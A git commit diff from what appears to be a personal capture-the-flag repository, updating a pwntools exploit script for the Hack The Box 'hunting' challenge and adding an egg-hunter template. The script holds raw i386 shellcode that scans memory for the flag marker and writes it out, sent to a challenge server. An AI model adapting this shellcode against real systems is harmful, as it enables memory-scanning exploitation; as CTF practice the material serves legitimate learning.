652e00d57e5430061d1d0610682146644fab534a
Fresh <fr3shnuts@gmail.com>
2022-08-27 21:01:02 -0700

    hunting

--- htb/hunting/x.py
+++ htb/hunting/x.py
@@ -6,23 +6,18 @@ elf = ELF("./hunting")
 #libc = ELF("./libc.so.6")
 #ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}
 
+p = remote("206.189.117.48", 32306)
+#p = process("./hunting")
+#p = gdb.debug("./hunting", '''
+#break *read
+#''')
 
 # HTB{
 egg = "\x48\x54\x42\x7b"
 
+# Egg hunt for "HTB{".
+# Then SYCALL write() flag.
 eh3 = "\x6a\x3c\x5b\x6a\x07\x58\xcd\x80\xba\x00\x00\x00\x00\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x5a\x04\x31\xc0\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xe9\xbf\x48\x54\x42\x7b\x39\x3a\x75\xe5\x89\xd1\x6a\x24\x5a\x6a\x01\x5b\x6a\x04\x58\xcd\x80"
-
-
-#egghunter = asm(shellcraft.i386.linux.egghunter(egg, start_address = 0))
-#eggfound = asm(shellcraft.i386.linux.write(1, 'edi', 32))
-
-
-#p = process("./hunting")
-p = remote("206.189.117.48", 32306)
-
-#p = gdb.debug("./hunting", '''
-#break *read
-#''')
 
 payload = ""
 payload += eh3
---
+++ templates/egg_hunter.py
@@ -0,0 +1,7 @@
+from pwn import *
+
+
+egg = "\x41\x41\x41\x41"
+
+#egghunter = asm(shellcraft.i386.linux.egghunter(egg, start_address = 0))
+#eggfound = asm(shellcraft.i386.linux.write(1, 'edi', 32))
